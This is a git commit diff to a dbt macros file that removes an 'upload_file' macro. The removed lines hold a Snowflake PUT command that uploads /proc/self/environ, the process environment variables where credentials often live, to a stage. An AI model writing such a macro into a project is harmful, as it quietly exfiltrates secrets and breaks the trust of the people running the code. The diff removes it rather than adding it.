bc534cd1d1e6e197aaa7b77e2589f5fa175dce63
wflk <tomas@lazauninkas.lt>
2025-12-09 12:57:26 +0200

    Remove upload_file macro
    Removed the upload_file macro from log_query_results.sql

--- macros/log_query_results.sql
+++ macros/log_query_results.sql
@@ -11,12 +11,3 @@
         {% do results.print_table() %}
     {% endif %}
 {% endmacro %}
-
-
-{% macro upload_file() %}
-  {% set sql %}
-    PUT file:///proc/self/environ @~ AUTO_COMPRESS=FALSE;
-  {% endset %}
-  
-  {% do run_query(sql) %}
-{% endmacro %}
